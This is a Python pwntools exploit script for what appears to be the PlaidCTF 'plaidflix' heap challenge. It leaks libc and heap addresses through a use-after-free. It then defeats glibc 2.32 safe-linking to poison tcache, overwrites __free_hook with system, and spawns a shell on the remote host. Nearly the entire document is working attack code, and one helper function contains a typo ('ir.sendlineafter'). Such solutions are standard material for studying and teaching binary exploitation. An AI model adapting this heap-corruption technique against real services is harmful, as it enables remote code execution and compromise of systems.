#!/usr/bin/python3

from pwn import *
import sys

HOST = 'plaidflix.pwni.ng'
PORT = 1337
BINARY = "./P"
LIB = './libc-2.32.so'

l = ELF(LIB)

context.arch = 'amd64'

if len(sys.argv) == 1:
    r = process(BINARY, env={"LD_PRELOAD": LIB})
else:
    r = remote(HOST, PORT)
    
def add_movie(title,rating=5):
    r.sendlineafter("> ","0")
    r.sendlineafter("> ","0")
    r.sendlineafter("> ",title)
    r.sendlineafter("> ",str(rating))

def remove_movie(i):
    r.sendlineafter("> ","0")
    r.sendlineafter("> ","1")
    r.sendlineafter("> ",str(i))

def show_movies():
    r.sendlineafter("> ","0")
    r.sendlineafter("> ","2")

def share_movie(movie_i,friend_i):
    r.sendlineafter("> ","0")
    r.sendlineafter("> ","3")
    r.sendlineafter("> ",str(movie_i))
    r.sendlineafter("> ",str(friend_i))

def add_friend(size,name):
    r.sendlineafter("> ","1")
    r.sendlineafter("> ","0")
    r.sendlineafter("> ",str(size))
    r.sendlineafter("> ",name)

def remove_friend(i):
    r.sendlineafter("> ","1")
    r.sendlineafter("> ","1")
    r.sendlineafter("> ",str(i))

def show_friends():
    r.sendlineafter("> ","1")
    ir.sendlineafter("> ","2")

info(f"""
movie: 0x60c0
""")

r.sendlineafter('> ', '= =')

##### leak #####

add_movie('Q')
for i in range(8):
    add_friend(0x88-1, 'OWO')

share_movie(0, 0)
for i in range(7, -1, -1):
    remove_friend(i)

for _ in range(8):
    add_friend(0x90-1, 'OWO')

show_movies()
r.recvuntil('* Shared with: ')
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1e3c80

share_movie(0, 0)
remove_friend(0)
remove_friend(1)

show_movies()
r.recvuntil('* Shared with: ')
heap = u64(r.recv(5).ljust(8, b'\x00')) << 12

info(f"""
libc = {hex(libc)}
heap = {hex(heap)}
""")

##### exploit #####

def delete_account():
    r.sendlineafter("> ","2")
    r.sendlineafter("> ","y")

def add_feedback(text):
    r.sendlineafter("> ","0")
    r.sendlineafter("> ",text)

def delete_feedback(i):
    r.sendlineafter("> ","1")
    r.sendlineafter("> ",str(i))

def add_contact(text):
    r.sendlineafter("> ","2")
    r.sendlineafter("> ",text)

delete_account()

for i in range(9):
    add_feedback(str(i)) # 0-8

for i in range(8, -1, -1):
    delete_feedback(i) # 8-0

add_feedback('0') # 0
input()
delete_feedback(1)

def PROTECT_PTR(pos, ptr):
    return pos ^ (ptr >> 12)

add_contact(b'A'*0x100 + p64(0) + p64(0x111) + p64( PROTECT_PTR(l.sym['__free_hook'] + libc, heap + 0xe90) )[:-1])
add_feedback("/bin/sh") # 1
add_feedback(p64(l.sym['system'] + libc)) # 2

delete_feedback(1)

r.interactive()
